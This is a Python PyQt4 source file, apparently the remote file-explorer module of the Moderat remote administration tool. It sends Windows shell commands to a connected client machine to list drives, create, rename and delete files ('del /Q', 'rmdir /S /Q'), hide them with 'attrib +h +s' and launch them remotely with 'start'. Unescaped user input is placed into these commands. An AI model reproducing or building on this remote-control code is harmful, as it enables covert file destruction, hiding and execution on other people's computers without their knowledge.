from PyQt4.QtGui import *
from PyQt4.QtCore import *
from main_ui import Ui_Form
import ast
import os
import base64
import string
import random
from libs.dialogs import message, text


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)
        self.anim = QPropertyAnimation(self, 'windowOpacity')
        self.anim.setDuration(500)
        self.anim.setStartValue(0)
        self.anim.setEndValue(1)
        self.anim.start()

        self.moderat = args['moderat']
        self.client = args['client']
        self.module_id = args['module_id']
        self.alias = args['alias']
        self.ip_address = args['ip_address']
        self.p2p = args['p2p']

        title_prefix = self.alias if len(self.alias) > 0 else self.ip_address

        self.setWindowTitle(u'[{}] {}'.format(title_prefix, self.moderat.MString('MEXPLORER_TITLE')))

        self.gui = QApplication.processEvents

        self.set_language()

        self.upButton.clicked.connect(self.parent_folder)
        self.explorerTable.doubleClicked.connect(self.open_folder)
        self.explorerPathEntry.returnPressed.connect(self.open_path)
        self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.drive_change)

        self.explorerTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.explorerTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.right_click_menu)

        self.get_content()

    def signal(self, data):
        self.callback(data)

    def send(self, message):
        self.moderat.send_message(
            message,
            'explorerMode',
            session_id=self.moderat.session_id,
            _to=self.client,
            module_id=self.module_id,
            p2p=self.p2p
        )

    def set_language(self):
        self.explorerTable.horizontalHeaderItem(0).setText(self.moderat.MString('MEXPLORER_TYPE'))
        self.explorerTable.horizontalHeaderItem(1).setText(self.moderat.MString('MEXPLORER_NAME'))
        self.explorerTable.horizontalHeaderItem(2).setText(self.moderat.MString('MEXPLORER_DATE_MODIFIED'))
        self.explorerTable.horizontalHeaderItem(3).setText(self.moderat.MString('MEXPLORER_SIZE'))
        self.fileLabel.setText(self.moderat.MString('MEXPLORER_FILE'))
        self.dirLabel.setText(self.moderat.MString('MEXPLORER_FOLDER'))
        self.hfileLabel.setText(self.moderat.MString('MEXPLORER_HIDDEN_FILE'))
        self.hdirLabel.setText(self.moderat.MString('MEXPLORER_HIDDEN_FOLDER'))
        self.selectedLabel.setText(self.moderat.MString('MEXPLORER_SELECTED'))
        self.dirfilesLabel.setText(self.moderat.MString('MEXPLORER_FOLDERS_FILES'))

    def right_click_menu(self, point):
        self.emenu = QMenu(self)
        try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            # File commands
            if '<FILE>' in _type:
                pass
                #self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'download.png')), self.moderat.MString('MEXPLORER_DOWNLOAD'), self.download)

            # Folder commands
            elif '<DIR>' in _type:
                pass
                #self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'open.png')), self.moderat.MString('MEXPLORER_OPEN_FOLDER'), self.open_folder)

            # Global commands
            self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'execute.png')), self.moderat.MString('MEXPLORER_EXECUTE'), self.execute_remotely)
            self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'set_alias.png')), self.moderat.MString('MEXPLORER_RENAME'), self.rename)
            self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'eye.png')), self.moderat.MString('MEXPLORER_HIDDEN'), self.hidden)
            self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'trash.png')), self.moderat.MString('MEXPLORER_DELETE'), self.remove)
            self.emenu.addSeparator()
        except AttributeError as e:
            print e

        # Commands for all
        self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'update_source.png')), self.moderat.MString('MEXPLORER_REFRESH'), self.refresh)
        self.emenu.addSeparator()
        self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'add_file.png')), self.moderat.MString('MEXPLORER_CREATE_FILE'), self.create_file)
        self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'add_folder.png')), self.moderat.MString('MEXPLORER_CREATE_FOLDER'), self.create_dir)
        self.emenu.exec_(self.explorerTable.mapToGlobal(point))

    def refresh(self):
        self.get_content()

    def create_file(self):
        ok, value = text.get(self.moderat.MString('MEXPLORER_MSG_NEW_FILE'), self.moderat.MString('MEXPLORER_MSG_NEW_FILE'),
                             self.moderat.MString('MEXPLORER_MSG_NEW_FILE'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
        if ok:
            self.send('type Nul > "%s"' % value)
            self.callback = self.recv_content

    def create_dir(self):
        ok, value = text.get(self.moderat.MString('MEXPLORER_MSG_NEW_FOLDER'), self.moderat.MString('MEXPLORER_MSG_NEW_FOLDER'),
                             self.moderat.MString('MEXPLORER_MSG_NEW_FOLDER'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
        if ok:
            self.send('mkdir "%s"' % value)
            self.callback = self.recv_content

    def rename(self):
        target = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
        ok, value = text.get(self.moderat.MString('MEXPLORER_MSG_RENAME'), self.moderat.MString('MEXPLORER_MSG_RENAME_WITH'),
                             self.moderat.MString('MEXPLORER_MSG_RENAME_WITH'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
        if ok:
            self.send('rename {} {}'.format(target, value))
            self.callback = self.recv_content

    def hidden(self):
        item = self.explorerTable.item(self.explorerTable.currentItem().row(), 1)
        _file = str(item.text())
        hidden_color = item.textColor().name()
        if hidden_color in ['#3498db', '#9b59b6']:
            self.send('attrib -h -s {}'.format(_file))
        else:
            self.send('attrib +h +s {}'.format(_file))
        self.callback = self.recv_content

    # Execute File Remotely
    def execute_remotely(self):
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        self.send('start /d %CD% {}'.format(_file))
        self.callback = self.recv_content

    def remove(self):
        try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())

            warn = QMessageBox(QMessageBox.Question, self.moderat.MString('MEXPLORER_MSG_CONFIRM'), self.moderat.MString('MEXPLORER_MSG_DELETE'))
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                if '<FILE>' in _type:
                    self.send('del /Q "%s"' % _file)
                elif '<DIR>' in _type:
                    self.send('rmdir /S /Q "%s"' % _file)
                self.callback = self.recv_content
            else:
                return
        except AttributeError:
            message.error(self.moderat.MString('MEXPLORER_MSG_ERROR'), self.moderat.MString('MEXPLORER_MSG_NO_FILE'))

    # open remote folder
    def open_folder(self):

        # Get folder name
        _type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
        _name = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()

        if '<DIR>' in _type:
            # Choose new folder
            self.send('cd %s' % _name)
            self.callback = self.recv_content

    # open remote folder from path entry
    def open_path(self):
        self.send('cd {}'.format(str(self.explorerPathEntry.text())))
        self.callback = self.recv_content

    # open parent folder
    def parent_folder(self):
        self.send('cd ..')
        self.callback = self.recv_content

    # Change Drive
    def drive_change(self):
        if not self.comboInEditMode:
            self.send('cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())))
            self.callback = self.recv_content

    def get_content(self):
        self.send('getContent')
        self.callback = self.recv_content

    def recv_content(self, data):
        # set remote path entry
        try:
            content = ast.literal_eval(data['payload'])
        except (SyntaxError, ValueError):
            message.error(self.moderat.MString('MEXPLORER_OPEN_FOLDER_ERROR'), self.moderat.MString('MEXPLORER_OPEN_FOLDER_ERROR'))
            return
        # Init Logical Drives
        self.comboInEditMode = True
        self.explorerDrivesDrop.clear()
        for drive_letter in content['logicalDrives'].keys():
            self.explorerDrivesDrop.addItem(drive_letter)

        # Get active drive caption
        self.explorerDrivesDrop.setCurrentIndex(
            self.explorerDrivesDrop.findText(content['path'].split('\\')[0]+'\\', Qt.MatchFixedString))


        # Initializing table
        self.explorerTable.clearContents()
        self.explorerTable.sortItems(0)
        self.explorerPathEntry.setText(content['path'])

        # Turn combo signal off
        self.comboInEditMode = False

        # set tables row count
        self.explorerTable.setRowCount(len(content) - 2)

        file_count = 0
        folder_count = 0

        # add content to table
        for index in content:

            if index == 'path' or index == 'logicalDrives':
                continue

            if content[index]['hidden']:
                file_color = QColor('#9b59b6')
                file_icon = os.path.join(self.moderat.assets, 'hidden_file.png')
                folder_color = QColor('#3498db')
                folder_icon = os.path.join(self.moderat.assets, 'hidden_folder.png')
            else:
                file_color = QColor('#ecf0f1')
                file_icon = os.path.join(self.moderat.assets, 'file.png')
                folder_color = QColor('#e67e22')
                folder_icon = os.path.join(self.moderat.assets, 'folder.png')

            # set content type
            item = QTableWidgetItem('<FILE>') if content[index]['type'] else QTableWidgetItem('<DIR>')
            if content[index]['type']:
                item.setTextColor(file_color)
                item.setSizeHint(QSize(50, 30))
                file_count += 1
            else:
                item.setTextColor(folder_color)
                item.setSizeHint(QSize(50, 30))
                folder_count += 1
            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
            self.explorerTable.setItem(index, 0, item)

            # set content name
            item = QTableWidgetItem(content[index]['name'])
            if content[index]['type']:
                item.setTextColor(file_color)
                item.setIcon(QIcon(QPixmap(file_icon)))
            else:
                item.setTextColor(folder_color)
                item.setIcon(QIcon(QPixmap(folder_icon)))
            self.explorerTable.setItem(index, 1, item)

            # set content modified date
            item = QTableWidgetItem(content[index]['modified'])
            item.setTextAlignment(Qt.AlignCenter)
            item.setSizeHint(QSize(220, 30))
            self.explorerTable.setItem(index, 2, item)

            # set file size
            item = QTableWidgetItem(self.sizeof_fmt(content[index]['size'])) if content[index]['type'] else QTableWidgetItem('')
            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
            item.setTextColor(file_color)
            self.explorerTable.setItem(index, 3, item)

        # update table
        self.explorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)
        self.explorerTable.resizeColumnsToContents()

        # set folders & files count
        self.dirfilesCountLabel.setText('{0}/{1}'.format(folder_count, file_count))

    def sizeof_fmt(self, num):
        suffix = self.moderat.MString('MEXPLORER_B')
        for unit in ['', self.moderat.MString('MEXPLORER_K'),
                     self.moderat.MString('MEXPLORER_M'),
                     self.moderat.MString('MEXPLORER_G'),
                     self.moderat.MString('MEXPLORER_T'),
                     self.moderat.MString('MEXPLORER_P'),
                     self.moderat.MString('MEXPLORER_E'),
                     self.moderat.MString('MEXPLORER_Z'), ]:
            if abs(num) < 1024.0:
                return "%3.1f%s%s" % (num, unit, suffix)
            num /= 1024.0
        return "%.1f%s%s" % (num, 'Yi', suffix)

    def closeEvent(self, QCloseEvent):
        self.send(self.module_id)
